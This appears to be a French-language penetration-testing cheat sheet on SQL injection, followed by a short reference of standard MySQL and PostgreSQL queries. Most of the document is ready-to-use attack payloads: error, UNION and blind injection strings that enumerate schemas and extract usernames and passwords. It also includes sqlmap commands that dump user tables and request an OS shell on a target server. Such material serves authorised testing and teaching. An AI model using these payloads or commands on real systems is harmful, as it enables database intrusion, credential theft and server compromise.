---
title: "SQL Injection et Requêtes de Base de Données : Référence du Pentester"
description: "Payloads d'injection SQL, attaques UNION, techniques de blind SQLi et requêtes standard pour MySQL et PostgreSQL. Une référence tactique pour les testeurs d'intrusion et les administrateurs de bases de données."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["payloads injection sql", "cheatsheet commandes mysql", "cheat sheet postgresql", "piratage base de données", "commandes sqlmap", "union sql injection", "blind sql injection", "test injection sql", "énumération base de données", "prévention injection sql"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection et Requêtes de Base de Données : Référence du Pentester",
    "description": "Payloads d'injection SQL, attaques UNION, blind SQLi et requêtes pour MySQL et PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "fr"
  }
---

## Initialisation du Système

L'injection SQL reste l'une des vulnérabilités les plus critiques des applications web — constamment classée dans le Top 10 de l'OWASP. Elle se produit lorsque l'entrée utilisateur est concaténée directement dans les requêtes SQL sans assainissement approprié, permettant à un attaquant de manipuler la logique de la requête à la base de données. Une injection SQL réussie peut mener à l'exfiltration complète des données, au contournement de l'authentification, à l'escalade de privilèges et, dans certains cas, à l'exécution de commandes à distance sur le serveur de base de données. Ce manuel de terrain fournit à la fois les payloads offensifs pour les tests d'intrusion autorisés et les requêtes SQL standard que tout administrateur de base de données doit connaître.

Toutes les techniques d'injection sont destinées uniquement aux tests autorisés. L'accès non autorisé est illégal.

---

## Détection de SQLi

Avant d'exploiter une vulnérabilité d'injection SQL, vous devez confirmer son existence. La détection consiste à envoyer des entrées spécialement conçues aux paramètres de l'application et à observer la réponse à la recherche de messages d'erreur, de changements de comportement ou de différences de temps. Ces sondes initiales vous indiquent si le paramètre est injectable et quel type d'injection est possible.

### Payloads de détection de base

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identifier le backend de la base de données

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## Attaques UNION

L'injection SQL basée sur UNION est la technique la plus puissante lorsque les messages d'erreur ou les résultats des requêtes sont affichés sur la page. Elle fonctionne en ajoutant une instruction `UNION SELECT` à la requête originale, vous permettant d'extraire des données de n'importe quelle table de la base de données. L'exigence clé est de déterminer le nombre correct de colonnes dans la requête originale pour que l'instruction UNION corresponde.

### Déterminer le nombre de colonnes

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Extraire des données

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

Lorsque l'application n'affiche pas les résultats des requêtes ni les messages d'erreur sur la page, vous êtes face à une blind SQL injection. La vulnérabilité existe toujours, mais l'extraction de données nécessite de l'inférence — soit par des conditions booléennes (la page change-t-elle ?), soit par des délais temporels (la réponse prend-elle plus de temps ?). La blind SQLi est plus lente mais tout aussi dangereuse.

### Blind basée sur les booléens

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Blind basée sur le temps

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Automatisation avec SQLMap

SQLMap est l'outil standard de l'industrie pour la détection et l'exploitation automatisées des injections SQL. Il gère la détection, le fingerprinting, l'extraction de données et même l'accès au niveau du système d'exploitation via l'injection SQL — le tout en ligne de commande. Pour les tests d'intrusion autorisés, il accélère considérablement la phase d'exploitation.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Requêtes SQL Standard

Au-delà des tests d'injection, tout professionnel de la sécurité et développeur doit connaître le SQL standard pour l'administration des bases de données, l'analyse des logs et l'extraction de données lors des investigations. Ces requêtes fonctionnent sur MySQL et PostgreSQL et couvrent les opérations de base de données les plus courantes.

### Requêtes SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### Requêtes JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Administration de la base de données

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
